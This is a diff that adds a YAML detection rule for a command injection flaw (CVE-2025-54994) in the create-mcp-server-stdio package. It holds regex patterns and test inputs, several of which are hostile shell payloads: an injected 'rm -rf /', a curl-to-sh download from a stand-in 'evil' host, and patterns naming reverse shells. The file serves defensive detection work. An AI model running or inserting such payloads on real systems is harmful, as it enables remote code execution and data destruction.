@@ -1,0 +1,138 @@
+title: Command Injection in create-mcp-server-stdio via Unsafe exec() Concatenation (CVE-2025-54994)
+id: ATR-2026-00577
+rule_version: 1
+status: experimental
+description: 'GitHub Security Advisory GHSA-3ch2-jxxc-v4xf (CVE-2025-54994). The
+  create-mcp-server-stdio npm package builds shell commands by concatenating MCP
+  stdio tool parameters directly into exec(), so shell metacharacters supplied
+  through a tool argument (; | && $() backticks) are interpreted by the shell and
+  execute arbitrary commands on the server host (RCE).
+
+  '
+author: ATR Community (vulnerablemcp sync)
+date: 2026/06/12
+schema_version: '0.1'
+detection_tier: pattern
+maturity: experimental
+severity: critical
+references:
+  cve:
+  - CVE-2025-54994
+  cwe:
+  - CWE-78
+  ghsa:
+  - GHSA-3ch2-jxxc-v4xf
+  vulnerablemcp_id:
+  - cve-2025-54994-command-injection-mcp-stdio
+  external:
+  - https://github.com/advisories/GHSA-3ch2-jxxc-v4xf
+metadata_provenance:
+  vulnerablemcp: vulnerablemcp-sync
+  cve: vulnerablemcp-sync
+  cwe: vulnerablemcp-sync
+tags:
+  category: tool-poisoning
+  scan_target: runtime
+  confidence: high
+agent_source:
+  type: tool_invocation
+  framework:
+  - any
+  provider:
+  - any
+detection:
+  condition: any
+  false_positives: []
+  conditions:
+  - field: content
+    operator: regex
+    value: (?i)(?:create-mcp-server-stdio[^\n]{0,200}\bexec\s*\(\s*(?:[`"'\x27][^`"'\x27\n]{0,160}[`"'\x27]\s*\+|`[^`\n]{0,160}\$\{)|\bexec\s*\(\s*(?:[`"'\x27][^`"'\x27\n]{0,160}[`"'\x27]\s*\+|`[^`\n]{0,160}\$\{)[^\n]{0,200}create-mcp-server-stdio)
+    description: Detects the create-mcp-server-stdio exec() construct that concatenates
+      a variable into the shell command string (string + concatenation or template
+      literal ${...} interpolation), the exact CVE-2025-54994 sink.
+  - field: tool_input
+    operator: regex
+    value: (?i)create-mcp-server-stdio[^\n]{0,200}\bexec\s*\([^)\n]{0,160}(?:;\s*\S|&&\s*\S|\|\|\s*\S|\|\s*\w|`[a-z][\w/.-]*`|\$\([a-z])
+    description: Detects an MCP stdio tool parameter routed into create-mcp-server-stdio's
+      exec() that already carries shell metacharacters (command separators, pipes,
+      backtick or $() command substitution), indicating live injection.
+  - field: content
+    operator: regex
+    value: (?i)create-mcp-server-stdio[^\n]{0,160}(?:\bexec\s*\([^)\n]{0,120})(?:\brm\s+-rf|\bnc\s+-[a-z]*e|/bin/sh|\bbash\s+-i|\bcurl\s+[^\n|]{0,80}\|\s*(?:sh|bash)|\bwget\s+[^\n|]{0,80}\|\s*(?:sh|bash))
+    description: Detects create-mcp-server-stdio exec() carrying a classic post-injection
+      payload (reverse shell, destructive rm, or curl|sh dropper) inside the
+      concatenated command.
+response:
+  actions:
+  - alert
+  - block_tool
+  message_template: '[ATR-2026-00577] CVE-2025-54994: create-mcp-server-stdio passes
+    MCP stdio tool input into exec() with shell metacharacters, enabling arbitrary
+    command execution (CWE-78 / RCE). Remediation: upgrade create-mcp-server-stdio
+    to a patched release, and replace exec() with execFile()/spawn() using an
+    argument array (never concatenate tool input into a shell string); validate and
+    sandbox all MCP stdio server input.'
+  notify:
+  - security_team
+confidence: 85
+wild_fp_rate: 0
+test_cases:
+  true_positives:
+  - input: 'create-mcp-server-stdio: exec("ls " + toolInput.path)'
+    expected: triggered
+    description: exec() concatenating a tool parameter into the shell command (the CVE sink)
+  - input: 'const { stdout } = await exec("git log " + args.ref); // create-mcp-server-stdio handler'
+    expected: triggered
+    description: string + concatenation of MCP arg into exec within create-mcp-server-stdio
+  - input: 'create-mcp-server-stdio handler => exec(`cat ${params.file}`)'
+    expected: triggered
+    description: template-literal interpolation of tool input into exec
+  - input: 'create-mcp-server-stdio tool called with path="; rm -rf /" -> exec("ls ; rm -rf /")'
+    expected: triggered
+    description: live injection payload with command separator and destructive rm in exec
+  - input: 'create-mcp-server-stdio exec("ping " + host) where host=$(curl http://evil/x|sh)'
+    expected: triggered
+    description: command substitution $() carried through create-mcp-server-stdio exec
+  - input: 'create-mcp-server-stdio: exec("echo `whoami`") from tool param'
+    expected: triggered
+    description: backtick command substitution in create-mcp-server-stdio exec sink
+  true_negatives:
+  - input: 'npx create-mcp-server-stdio my-server --transport stdio'
+    expected: not_triggered
+    description: legitimate scaffold/CLI usage of the package with clean args
+  - input: 'create-mcp-server-stdio scaffolds a stdio MCP server using execFile("git", ["log", args.ref])'
+    expected: not_triggered
+    description: safe execFile with an argument array (the recommended fix)
+  - input: 'await spawn("ls", [userPath], { shell: false }) // create-mcp-server-stdio handler'
+    expected: not_triggered
+    description: spawn with arg array and shell disabled, no concatenation
+  - input: 'CVE-2025-54994 was fixed in create-mcp-server-stdio by replacing exec() with spawn() and an argument array.'
+    expected: not_triggered
+    description: patch-discussion / advisory text mentioning the package and fix
+  - input: 'Our research evaluated create-mcp-server-stdio among MCP stdio servers for unsafe command-execution patterns and shell metacharacter handling.'
+    expected: not_triggered
+    description: research abstract mentioning the package without an exec() concatenation sink
+  - input: 'import { createServer } from "create-mcp-server-stdio"; const server = createServer({ name: "demo" });'
+    expected: not_triggered
+    description: normal library import and instantiation, no exec sink
+  - input: 'exec("ls -la", { cwd: workdir }, callback)'
+    expected: not_triggered
+    description: generic exec with a static command, unrelated to create-mcp-server-stdio
+_llm_authored:
+  model: claude (gstack subagent)
+  generalization_note: 'The rule generalizes beyond the literal PoC by anchoring on
+    create-mcp-server-stdio together with its specific exec() concatenation sink:
+    (1) string + concatenation of a variable into the shell command, (2) template
+    literal ${...} interpolation, and (3) live shell metacharacters (; | && $()
+    backticks) or classic post-injection payloads (reverse shell, rm -rf, curl|sh)
+    appearing inside that exec() call. The create-mcp-server-stdio marker may appear
+    within 200 chars on EITHER side of the exec() sink (e.g. as a leading handler
+    label or a trailing handler comment), so the package context is still required
+    but its position relative to the sink is not fixed. It deliberately does NOT match the JSON
+    "command"/"args" config arrays (Flowise/LibreChat/litellm/mcp-stdio-config
+    rules) nor the --mcp CLI flag form (PraisonAI), so the surface is unique to the
+    create-mcp-server-stdio exec() concatenation construct. Safe execFile/spawn with
+    argument arrays, scaffold CLI usage, library imports, and advisory/research text
+    are excluded.'
+  note: Generation-time authoring; verified by deterministic gate. Runtime detection
+    is pure regex. Human review required before merge.
